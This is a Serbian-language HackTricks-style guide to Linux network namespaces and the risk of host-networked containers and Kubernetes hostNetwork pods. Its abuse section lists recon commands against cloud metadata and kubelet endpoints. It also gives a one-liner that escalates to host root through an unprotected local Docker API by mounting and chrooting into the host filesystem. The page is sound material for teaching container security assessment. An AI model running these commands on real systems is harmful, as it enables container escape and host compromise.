# Mrežni namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Pregled

Network namespace izoluje mrežne resurse kao što su interfejsi, IP adrese, tabele rutiranja, ARP/neighbor status, pravila vatrozida, soketi i sadržaj fajlova kao što je `/proc/net`. Zbog toga kontejner može izgledati kao da ima svoj `eth0`, svoje lokalne rute i svoj loopback uređaj, iako ne poseduje stvarni mrežni stack hosta.

Sa bezbednosnog aspekta, ovo je važno zato što mrežna izolacija podrazumeva mnogo više od vezivanja portova. Privatni mrežni namespace ograničava šta workload može direktno da uoči ili rekonfiguriše. Kada se taj namespace podeli sa hostom, kontejner može iznenada dobiti uvid u listener-e na hostu, servise lokalne za host i mrežne kontrolne tačke koje nikada nisu trebale biti izložene aplikaciji.

## Funkcionisanje

Novo kreirani mrežni namespace počinje sa praznim ili skoro praznim mrežnim okruženjem dok mu se ne prikače interfejsi. Container runtimes potom kreiraju ili povezuju virtuelne interfejse, dodeljuju adrese i konfigurišu rute tako da workload ima očekivanu konektivnost. U bridge-based deploymentima, to obično znači da kontejner vidi veth-backed interfejs povezan na host bridge. U Kubernetes, CNI plugin-i obavljaju odgovarajuću konfiguraciju za Pod networking.

Ova arhitektura objašnjava zašto je `--network=host` ili `hostNetwork: true` tako drastična promena. Umesto da dobije pripremljen privatni mrežni stack, workload se pridružuje stvarnom stacku hosta.

## Lab

Možete videti skoro prazan mrežni namespace pomoću:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
Možete uporediti normalne i host-networked kontejnere sa:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
Kontejner koji koristi host mrežu više nema svoj izolovani prikaz soketa i interfejsa. Sama ta promena je već značajna pre nego što uopšte pitate koje privilegije/process capabilities proces ima.

## Korišćenje u runtime-u

Docker i Podman obično kreiraju privatni network namespace za svaki kontejner osim ako nije drugačije konfigurisano. Kubernetes obično dodeljuje svakom Pod-u sopstveni network namespace, koji se deli između kontejnera unutar tog Pod-a, ali je odvojen od hosta. Incus/LXC sistemi takođe pružaju bogatu izolaciju zasnovanu na network namespace-ovima, često sa većim spektrom virtuelnih mrežnih konfiguracija.

Opšti princip je da je privatno umrežavanje podrazumevana granica izolacije, dok je korišćenje mreže hosta eksplicitno odustajanje od te granice.

## Pogrešne konfiguracije

Najvažnija pogrešna konfiguracija je jednostavno deljenje host network namespace-a. To se ponekad radi radi performansi, niskonivoovskog nadgledanja ili radi praktičnosti, ali time se uklanja jedna od najčistijih granica dostupnih kontejnerima. Host-local slušaoci postaju dostupniji na direktniji način, servisi koji su bili dostupni samo na localhost mogu postati pristupačni, a privilegije kao `CAP_NET_ADMIN` ili `CAP_NET_RAW` postaju mnogo opasnije jer se operacije koje omogućavaju sada primenjuju na mrežno okruženje samog hosta.

Drugi problem je prekomerno dodeljivanje mrežnih privilegija čak i kada je network namespace privatan. Privatan namespace pomaže, ali ne čini raw sockets ili naprednu kontrolu mreže bezopasnom.

U Kubernetes-u, `hostNetwork: true` takođe menja koliko možete verovati segmentaciji mreže na nivou Pod-a. Kubernetes dokumentuje da mnogi network plugin-ovi ne mogu pravilno razlikovati `hostNetwork` Pod saobraćaj za `podSelector` / `namespaceSelector` podudaranja i stoga ga tretiraju kao običan node traffic. Iz ugla napadača, to znači da kompromitovan `hostNetwork` workload treba često tretirati kao mrežni uporište na nivou node-a, a ne kao normalan Pod koji je i dalje ograničen istim pretpostavkama politike kao workloads na overlay mreži.

## Zloupotreba

U slabo izolovanim okruženjima, napadači mogu pregledavati servise koji slušaju na hostu, dohvatiti management endpoint-e vezane samo za loopback, prisluškivati ili remetiti saobraćaj u zavisnosti od tačnih privilegija i okruženja, ili rekonfigurisati routing i stanje firewall-a ako je prisutan `CAP_NET_ADMIN`. U klasteru, ovo takođe može olakšati lateralno kretanje i rekognosciranje control-plane-a.

Ako sumnjate na host networking, počnite tako što ćete potvrditi da vidljivi interfejsi i slušaoci pripadaju hostu, a ne izolovanoj kontejnerskoj mreži:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Servisi dostupni samo na loopback interfejsu često su prvo zanimljivo otkriće:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Ako su prisutne network capabilities, testirajte da li workload može da pregleda ili izmeni vidljivi stack:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
Na modernim kernelima, host networking zajedno sa `CAP_NET_ADMIN` takođe može otkriti putanju paketa izvan jednostavnih izmena u `iptables` / `nftables`. `tc` qdiscs i filteri su takođe ograničeni na namespace, pa se u deljenom host network namespace-u primenjuju na host interfejse koje container može videti. Ako je dodatno prisutan `CAP_BPF`, mrežno povezani eBPF programi kao što su TC i XDP loaders postaju relevantni:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
echo "== $i =="
tc qdisc show dev "$i" 2>/dev/null
tc filter show dev "$i" ingress 2>/dev/null
tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```
Ovo je važno zato što napadač može da mirror, redirect, shape ili drop saobraćaj na nivou host interfejsa, a ne samo da prepiše firewall pravila. U privatnom network namespace-u te akcije su ograničene na prikaz kontejnera; u deljenom host namespace-u one postaju host-impacting.

U cluster ili cloud okruženjima, host networking takođe opravdava brz local recon metadata i control-plane-adjacent services:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
### Potpun primer: Host Networking + Local Runtime / Kubelet Access

Host networking ne obezbeđuje automatski host root, ali često izlaže servise koji su namerno dostupni samo sa samog node-a. Ako je jedan od tih servisa slabo zaštićen, host networking postaje direktan privilege-escalation path.

Docker API on localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet na localhost:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Uticaj:

- direktno kompromitovanje hosta ako je lokalni runtime API izložen bez odgovarajuće zaštite
- cluster reconnaissance or lateral movement ako su kubelet ili lokalni agenti dostupni
- traffic manipulation or denial of service kada se kombinuje sa `CAP_NET_ADMIN`

## Provere

Cilj ovih provera je da utvrdite da li proces ima privatni mrežni stack, koje rute i listeneri su vidljivi, i da li mrežni prikaz već deluje kao host pre nego što uopšte testirate capabilities.
```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
```
Zanimljivo ovde:

- Ako `/proc/self/ns/net` i `/proc/1/ns/net` već izgledaju kao na hostu, container možda deli host network namespace ili neki drugi ne-privatni namespace.
- `lsns -t net` i `ip netns identify` su korisni kada je shell već unutar imenovanog ili persistentnog namespace-a i želite da ga povežete sa `/run/netns` objektima sa strane hosta.
- `ss -lntup` je posebno vredan jer otkriva loopback-only listeners i lokalne management endpoints.
- Rute, imena interfejsa, firewall context, `tc` stanje i eBPF attachments postaju mnogo važniji ako su prisutni `CAP_NET_ADMIN`, `CAP_NET_RAW` ili `CAP_BPF`.
- U Kubernetes-u, neuspešna resolucija imena servisa iz `hostNetwork` Pod-a može jednostavno značiti da Pod ne koristi `dnsPolicy: ClusterFirstWithHostNet`, a ne da servis ne postoji.

Prilikom pregleda containera, uvek procenite network namespace zajedno sa capability set-om. Host networking uz snažne network capabilities predstavlja potpuno drugačiju poziciju u odnosu na bridge networking uz ograničen podrazumevani capability set.

## References

- [Kubernetes NetworkPolicy and `hostNetwork` caveats](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [eBPF token and capability requirements for network-related eBPF programs](https://docs.ebpf.io/linux/concepts/token/)
{{#include ../../../../../banners/hacktricks-training.md}}
